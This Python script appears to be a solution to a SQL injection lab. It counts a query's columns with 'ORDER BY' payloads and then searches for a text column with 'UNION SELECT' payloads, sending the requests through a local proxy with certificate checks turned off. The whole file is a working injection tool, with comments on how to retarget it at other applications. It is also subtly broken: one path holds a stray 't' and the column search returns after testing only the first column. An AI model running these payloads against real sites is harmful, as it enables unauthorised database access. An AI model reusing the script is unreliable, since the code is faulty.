import requests;
import sys;
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

def exploit_sqli_column_number(url):
    path = "/filter?category=Gifts" #Change this path according to the target application
    for i in range(1,25):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies);
        res = r.text
        if "Error" in res: #Change this error message according to the target database
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = "t/filter?category=Gifts" #Change this path according to the target application
    for i in range(1, num_col + 1):
        string = "'a'"
        payload_list = ['null'] * num_col
        payload_list[i - 1] = string
        sql_payload = "' union select " + ",".join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies);
        res = r.text
        if string.strip('\'') in res:
            return i
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0]);
        print("[-] Example: %s www.example.com" % sys.argv[0]);
        sys.exit(-1);

    print("Figuring out the number of columns...");
    num_col = exploit_sqli_column_number(url);
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".");
        print("[+] Figuring out which columns contain text data...");
        string_column = exploit_sqli_string_field(url, num_col);
        if string_column:
            print("[+] The following columns contain text data: " + str(string_column) + ".");
        else:
            print("[-] Could not find any columns with text data.");
    else:
        print("[-] The SQLi attack failed.");